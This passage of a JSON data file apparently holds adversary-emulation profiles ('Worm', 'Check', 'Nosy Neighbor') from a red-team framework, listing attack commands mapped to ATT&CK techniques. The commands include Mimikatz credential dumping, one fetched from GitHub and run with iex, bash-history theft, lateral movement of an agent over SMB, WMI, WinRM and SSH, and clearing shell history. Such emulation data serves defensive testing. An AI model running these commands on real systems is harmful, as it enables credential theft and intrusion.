["powerview.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["13379ae1-d20e-4162-91f8-320d78a35e7f", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", "ability_name": "Powerkatz (Staged)", "ability_description": "Use Invoke-Mimikatz", "ability_tactic": "credential-access", "ability_technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "ability_platforms": {"windows": {"psh": {"command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.ntlm"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.sha1"}]}, "payloads": ["invoke-mimi.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "ability_name": "Find Domain", "ability_description": "Find Domain information", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nbtstat -n\n", "parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["14a21534-350f-4d83-9dd7-3c56b93a0c17", "None", "network.domain.name"], "possible_subsequent_abilities": []}, {"ability_id": "6d90e6fa-9324-4eb5-93be-9f737245bd7z", "ability_name": "Discover Domain Admins", "ability_description": "Use PowerView to query the Active Directory server to determine remote admins", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1069.002", "name": "Permission Groups Discovery: Domain Groups"}, "ability_platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n", "parsers": {"plugins.stockpile.app.parsers.netlocalgroup": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}]}, "payloads": ["powerview.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["6d90e6fa-9324-4eb5-93be-9f737245bd7z", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "ability_name": "Account-type Admin Enumerator", "ability_description": "Use PowerView to query the Active Directory server to determine remote admins", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1069.002", "name": "Permission Groups Discovery: Domain Groups"}, "ability_platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n", "parsers": {"plugins.stockpile.app.parsers.netlocalgroup": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}]}, "payloads": ["powerview.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "921055f4-5970-4707-909e-62f594234d91", "ability_name": "Remote Host Ping", "ability_description": "Ping a remote host to see if it is accessible", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "ping #{remote.host.fqdn}\n", "parsers": {"plugins.stockpile.app.parsers.firewallping": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "ability_name": "Mount Share", "ability_description": "Mount a windows share", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n", "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "ability_name": "Copy 54ndc47 (SMB)", "ability_description": "Copy 54ndc47 to remote host (SMB)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "ability_name": "Start 54ndc47 (WMI)", "ability_description": "Remotely executes 54ndc47 over WMI", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "ability_platforms": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}, "cmd": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "78e7504d-968f-477d-8806-4d6c04b94431": {"adversary_name": "Worm", "adversary_description": "Move laterally any way possible", "adversary_abilities_in_order": [{"ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "ability_name": "Parse SSH config", "ability_description": "Search for valid SSH commands in the config file", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "422526ec-27e9-429a-995b-c686a29561a4", "ability_name": "Dump history", "ability_description": "Get contents of bash history", "ability_tactic": "credential-access", "ability_technique": {"attack_id": "T1552.003", "name": "Unsecured Credentials: Bash History"}, "ability_platforms": {"darwin": {"sh": {"command": "find ~/.bash_sessions -name '*' -exec cat {} \\; 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "cat ~/.bash_history", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "ability_name": "View admin shares", "ability_description": "Network Share Discovery", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "ability_platforms": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "custom_parser_vals": {"json_key": "Path", "json_type": "str"}}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["530e47c6-8592-42bf-91df-c59ffbd8541b", "None", "domain.smb.share"], "possible_subsequent_abilities": []}, {"ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "ability_description": "Locate all active IP and FQDNs on the network", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["85341c8c-4ecb-4579-8f53-43e3e91d7617", "None", "remote.host.ip"], "possible_subsequent_abilities": []}, {"ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "ability_name": "Run PowerKatz", "ability_description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "ability_tactic": "credential-access", "ability_technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "ability_platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "None", "domain.user.name"], "possible_subsequent_abilities": [["ece5dde3-d370-4c20-b213-a1f424aa8d03", "domain.user.name", "None"]]}, {"ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "ability_name": "Find Hostname", "ability_description": "Find hostname of remote host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "ability_name": "Reverse nslookup IP", "ability_description": "Find hostname of remote IP in domain", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["fa4ed735-7006-4451-a578-b516f80e559f", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "ability_name": "Copy 54ndc47 (SMB)", "ability_description": "Copy 54ndc47 to remote host (SMB)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "ability_name": "Copy 54ndc47 (WinRM and SCP)", "ability_description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1570", "name": "Lateral Tool Transfer"}, "ability_platforms": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "ability_name": "Start 54ndc47 (WMI)", "ability_description": "Remotely executes 54ndc47 over WMI", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "ability_platforms": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}, "cmd": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"cmd.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "ability_name": "Start Agent (WinRM)", "ability_description": "Start Agent using WinRM (WinRM)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.006", "name": "Remote Services: Windows Remote Management"}, "ability_platforms": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "ability_name": "Start 54ndc47", "ability_description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.004", "name": "Remote Services: SSH"}, "ability_platforms": {"darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "01d77744-2515-401a-a497-d9f7241aac3c": {"adversary_name": "Check", "adversary_description": "Profile to check proper platform configuration. Observe outputs to verify.", "adversary_abilities_in_order": [{"ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989", "ability_name": "Current User", "ability_description": "Obtain user from current session", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "whoami\n"}}, "linux": {"sh": {"command": "whoami\n"}}, "windows": {"psh": {"command": "whoami\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722", "ability_name": "Print Working Directory", "ability_description": "Print the current working directory on the system", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "pwd\n"}}, "linux": {"sh": {"command": "pwd\n"}}, "windows": {"psh": {"command": "pwd\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8", "ability_name": "List Directory", "ability_description": "List contents of current directory", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ls\n"}}, "linux": {"sh": {"command": "ls\n"}}, "windows": {"psh": {"command": "dir\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68", "ability_name": "View Processes", "ability_description": "Display information about current system processes", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ps\n"}}, "linux": {"sh": {"command": "ps\n"}}, "windows": {"psh": {"command": "get-process\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa", "ability_name": "Network Interface Configuration", "ability_description": "View network configuration info for host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "sudo ifconfig\n"}}, "linux": {"sh": {"command": "sudo ifconfig\n"}}, "windows": {"psh": {"command": "ipconfig\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "9849d956-37ea-49f2-a8b5-f2ca080b315d", "ability_name": "Check Go", "ability_description": "Check to see if GoLang is installed", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518", "name": "Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "which go\n"}}, "linux": {"sh": {"command": "which go\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "830bb6ed-9594-4817-b1a1-c298c0f9f425", "ability_name": "Check Chrome", "ability_description": "Check to see if Gooogle Chrome browser is installed", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518", "name": "Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "which google-chrome\n"}}, "linux": {"sh": {"command": "which google-chrome\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5", "ability_name": "Check Python", "ability_description": "Check to see what version of python is installed", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518", "name": "Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "python3 --version;python2 --version;python --version\n"}}, "linux": {"sh": {"command": "python3 --version;python2 --version;python --version\n"}}, "windows": {"cmd": {"command": "python3 --version&python2 --version&python --version\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "0b73bf34-fc5b-48f7-9194-dce993b915b1": {"adversary_name": "Nosy Neighbor", "adversary_description": "Find preferred WIFI networks & disrupt the current connection", "adversary_abilities_in_order": [{"ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "ability_name": "Avoid logs", "ability_description": "Stop terminal from logging history", "ability_tactic": "defense-evasion", "ability_technique": {"attack_id": "T1070.003", "name": "Indicator Removal on Host: Clear Command History"}, "ability_platforms": {"darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "windows": {"psh": {"command": "Clear-History;Clear"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "c0da588f-79f0-4263-8998-7496b1a40596", "ability_name": "Identify active user", "ability_description": "Find user running agent", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["c0da588f-79f0-4263-8998-7496b1a40596", "None", "host.user.name"], "possible_subsequent_abilities": [["3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "host.user.name", "None"], ["3796a00b-b11d-4731-b4ca-275a07d83299", "host.user.name", "None"]]}, {"ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "ability_description": "Locate all active IP and FQDNs on the network", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": 